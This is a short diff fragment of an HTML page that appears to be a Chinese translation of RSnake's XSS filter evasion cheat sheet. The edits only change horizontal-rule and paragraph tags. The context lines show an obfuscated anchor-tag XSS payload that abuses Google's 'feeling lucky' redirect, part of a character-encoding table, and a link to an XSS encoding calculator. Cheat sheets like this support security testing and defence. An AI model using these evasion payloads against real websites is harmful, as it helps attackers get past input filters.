 
 <p><strong>Google "feeling lucky" III</strong>
@@ -1024,7 +1024,7 @@ Firefox 使用 Google的"feeling lucky" 函数去重定向用户输入的任何�
 <pre><code>&lt;A HREF="http://www.gohttp://www.google.com/ogle.com/"&gt;XSS&lt;/A&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>字符编码表</h2>
 
@@ -1102,24 +1102,24 @@ Firefox 使用 Google的"feeling lucky" 函数去重定向用户输入的任何�
 \u003C
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>字符编码和ip混淆器</h2>
 
 <p>下面地址中包含了在xss有用的各种基本转换器。
 http://ha.ckers.org/xsscalc.html</p>
 
-<hr />
+<hr>
 
 <h2>作者和主编</h2>
 
 <p>Robert "RSnake" Hansen</p>
 
-<hr />
+<hr>
 
 <h2>翻译</h2>
 
-<p>老道</p>      </p>
+<p>老道</p>      <p></p>
     
 			</body>
 		</html>
